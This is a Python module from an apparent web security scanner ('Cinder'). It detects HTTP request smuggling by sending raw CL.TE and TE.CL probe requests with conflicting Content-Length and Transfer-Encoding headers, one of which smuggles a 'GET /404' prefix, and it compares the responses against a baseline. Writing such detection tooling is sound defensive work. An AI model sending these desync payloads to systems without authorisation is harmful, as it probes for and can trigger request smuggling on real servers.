"""HTTP request smuggling probes (CL.TE / TE.CL)."""
from __future__ import annotations

import asyncio
import ssl
import time
from urllib.parse import urlparse

from core.reporter import Finding
from . import evidence

TIMEOUT = 8.0


def _payloads(host: str) -> dict[str, str]:
    headers = f"Host: {host}\r\nUser-Agent: Cinder/1.0\r\nConnection: close\r\n"
    return {
        "baseline": f"GET / HTTP/1.1\r\n{headers}\r\n",
        "CL.TE": (
            f"POST / HTTP/1.1\r\n{headers}"
            "Content-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n"
            "0\r\n\r\nGET /404 HTTP/1.1\r\nX-Ignore: "
        ),
        "TE.CL": (
            f"POST / HTTP/1.1\r\n{headers}"
            "Transfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n"
            "0\r\n\r\nX"
        ),
    }


def _status(data: bytes) -> int | None:
    try:
        return int(data.split(b" ", 2)[1])
    except (IndexError, ValueError):
        return None


async def _send(host: str, port: int, tls: bool, raw: str):
    context = ssl.create_default_context() if tls else None
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port, ssl=context), TIMEOUT
        )
    except Exception:
        return None, 0.0, None, True
    start = time.perf_counter()
    try:
        writer.write(raw.encode())
        await writer.drain()
        data = await asyncio.wait_for(reader.read(4096), TIMEOUT)
        return data.decode("latin-1", "ignore"), time.perf_counter() - start, _status(data), False
    except asyncio.TimeoutError:
        return "", TIMEOUT, None, True
    except Exception:
        return None, 0.0, None, True
    finally:
        writer.close()


async def run(base_url: str, verbose: bool = False) -> list[Finding]:
    parsed = urlparse(base_url)
    host = parsed.hostname
    if not host:
        return []
    tls = parsed.scheme == "https"
    port = parsed.port or (443 if tls else 80)

    payloads = _payloads(parsed.netloc)
    baseline_text, baseline_elapsed, baseline_status, baseline_timeout = await _send(
        host, port, tls, payloads["baseline"]
    )
    if verbose:
        import sys
        print(f"[VERBOSE] smuggle baseline → {baseline_status} ({baseline_elapsed:.0f}ms)", file=sys.stderr)
    if baseline_timeout or baseline_status is None:
        return []

    findings: list[Finding] = []
    statuses = {}
    for name in ("CL.TE", "TE.CL"):
        text, elapsed, status, timed_out = await _send(host, port, tls, payloads[name])
        statuses[name] = (text, status, timed_out)
        if verbose:
            import sys
            print(f"[VERBOSE] smuggle {name} → {status} ({elapsed:.0f}ms)", file=sys.stderr)

    # Desync signal = the two probes disagree, or one times out. Both returning 400
    # (e.g. a strict CDN rejecting malformed requests) is not evidence of smuggling.
    for name, (text, status, timed_out) in statuses.items():
        other = statuses["TE.CL" if name == "CL.TE" else "CL.TE"]
        desync = timed_out or (status in (400, 408) and other[1] not in (400, 408, None))
        if not desync:
            continue
        findings.append(evidence.raw(
            check="smuggle",
            severity="high",
            url=base_url,
            detail=f"Indikasi HTTP request smuggling ({name}): "
                   + ("timeout" if timed_out else f"status {status} [other probe: {other[1]}]"),
            request=f"{name} payload ke {parsed.netloc}",
            response=(text or "")[:800],
            payload=payloads[name],
        ))
    return findings
